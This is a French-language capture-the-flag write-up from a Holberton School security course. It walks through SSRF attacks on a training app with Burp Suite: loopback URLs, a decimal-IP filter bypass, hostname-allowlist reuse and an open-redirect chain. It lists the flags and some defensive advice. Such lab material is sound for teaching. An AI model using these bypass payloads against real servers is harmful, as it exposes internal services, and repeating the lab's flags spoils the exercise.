# 🛡️ SSRF Exploitation - ShopAdmin Challenge

## 📌 Description

Ce projet consiste à exploiter plusieurs vulnérabilités de type **SSRF (Server-Side Request Forgery)** présentes dans différentes versions d’une application web appelée **ShopAdmin**.

L’objectif est d’intercepter des requêtes HTTP via **Burp Suite**, de modifier un paramètre vulnérable (`articleApi`), et d’accéder à des ressources internes (admin dashboard) afin de récupérer des flags.

---

## 🧰 Outils utilisés

* Burp Suite
* Navigateur Firefox
* Environnement Docker (container cible)
* Proxy HTTP (interception des requêtes)

---

## 🌐 Application cible

```
http://web0x08.hbtn/
```

Chaque tâche correspond à une version différente de l’application :

* Task 0 → `/`
* Task 1 → `/app2/`
* Task 2 → `/app3/`
* Task 3 → `/app4-1/`

---

# 🚩 Task 0 - Basic SSRF Exploitation

## 🎯 Objectif

Exploiter une SSRF basique pour accéder à l’admin interne.

## 🧪 Étapes

1. Ouvrir :

```
http://web0x08.hbtn/
```

2. Cliquer sur un produit → déclencher **check reduction**

3. Dans **Burp Suite > Proxy > HTTP History**

   * Trouver : `POST /check-reduction`

4. Identifier le paramètre :

```
articleApi=http%3A%2F%2Finternal-api.shop.com%3A3000%2Fcheck-reduction
```

5. Envoyer dans **Repeater**

---

## 💥 Exploitation

### Test SSRF :

```
articleApi=http://127.0.0.1:3000/check-reduction
```

✔️ Réponse attendue :

```
Error fetching stock data
```

---

### Accès admin :

```
articleApi=http://127.0.0.1:3000/admin
```

---

### Récupération du flag :

```
articleApi=http://127.0.0.1:3000/admin/list-of-items
```

Dans le HTML :

```
Name = FLAG_0
```

📌 **Flag 0 :**

```
876c29d1284c29a282e5bd8618ea9247
```

---

# 🚩 Task 1 - SSRF Bypass (Decimal IP)

## 🎯 Objectif

Contourner un filtre bloquant `127.0.0.1`

## 🧪 Étapes

1. Ouvrir :

```
http://web0x08.hbtn/app2/
```

2. Intercepter :

```
POST /app2/check-reduction
```

---

## 💥 Exploitation

### Bypass avec IP décimale :

```
2130706433 = 127.0.0.1
```

### Test SSRF :

```
articleApi=http://2130706433:3001/app2/check-reduction
```

---

### Accès admin :

```
articleApi=http://2130706433:3001/admin
```

---

### Récupération du flag :

```
articleApi=http://2130706433:3001/admin/list-of-items
```

📌 **Flag 1 :**

```
d54ecb7c715091342a22b4fec0dd6758
```

---

# 🚩 Task 2 - Hostname Filtering

## 🎯 Objectif

Contourner une protection basée sur le hostname

## 🧪 Étapes

1. Ouvrir :

```
http://web0x08.hbtn/app3/
```

2. Intercepter :

```
POST /app3/check-reduction
```

---

## ❌ Tentatives bloquées

### Localhost :

```
127.0.0.1 → BLOCKED
```

### IP décimale :

```
Invalid hostname
```

---

## 💡 Solution

👉 Garder le hostname autorisé :

```
discount.newshop.tn
```

---

## 💥 Exploitation

### Accès admin :

```
articleApi=http://discount.newshop.tn:3002/admin
```

---

### Récupération du flag :

```
articleApi=http://discount.newshop.tn:3002/admin/list-of-items
```

📌 **Flag 2 :**

```
814a0be477b6fa8c613f5b5be2fb8043
```

---

# 🚩 Task 3 - SSRF via Open Redirect

## 🎯 Objectif

Exploiter une redirection interne pour atteindre l’admin

## 🧪 Étapes

1. Ouvrir :

```
http://web0x08.hbtn/app4-1/
```

2. Intercepter :

```
POST /app4-1/check-discount
```

3. Observer un endpoint :

```
/product/nextProduct?path=
```

---

## 💥 Exploitation

### Injection via redirection :

```
http://web0x08.hbtn:8080/product/nextProduct?path=http://127.0.0.1:8080/admin
```

---

### Payload encodé :

```
articleApi=http%3A%2F%2Fweb0x08.hbtn%3A8080%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F127.0.0.1%3A8080%2Fadmin
```

---

## 🏁 Résultat

Réponse :

```
The goal is achieved, well done. FLAG_3 ...
```

📌 **Flag 3 :**

```
(à récupérer dans la réponse)
```

---

# 🧠 Conclusion

Ce projet met en évidence plusieurs techniques SSRF :

* SSRF basique
* Bypass via IP décimale
* Contournement de filtre hostname
* Exploitation d’open redirect

---

## 🔐 Bonnes pratiques de sécurité

* Valider strictement les URLs côté serveur
* Interdire les IP internes (127.0.0.1, metadata, etc.)
* Utiliser des allowlists
* Désactiver les redirections automatiques

---

## 👨PJF POUR LE PEUPLE💻 Auteur

Projet réalisé dans le cadre de la formation **Cyber Security - Holberton School**

---

